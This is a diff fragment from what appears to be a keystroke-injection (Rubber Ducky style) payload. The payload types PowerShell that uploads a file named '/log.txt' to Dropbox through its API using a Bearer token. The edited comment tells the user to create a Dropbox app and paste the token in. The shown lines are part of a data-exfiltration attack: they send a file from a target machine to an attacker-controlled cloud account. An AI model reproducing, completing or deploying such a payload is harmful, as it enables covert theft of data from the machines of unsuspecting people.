@@ -16,7 +16,7 @@ STRING $targetPathAndFilename = ' "/log.txt" '
 ENTER
 STRING $arg = '{ "path": '+$targetpathAndFilename+', "mode": "add", "autorename": true, "mute": false }'
 ENTER
-REM ****YOU NEED TO EDIT next line that is all*** create and app in dropbox "https://www.dropbox.com/developers/apps/create?_tk=pilot_lp&_ad=ctabtn1&_camp=create " change permissions to write, then get token and enter token below
+REM go to "https://www.dropbox.com/developers/apps/create?_tk=pilot_lp&_ad=ctabtn1&_camp=create " create app and get token and put in place of "PUTYOURDROPBOXTOKENHERE" ** keep "Bearer "
 STRING $authorization = "Bearer PUTYOURDROPBOXTOKENHERE"
 ENTER
 STRING $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
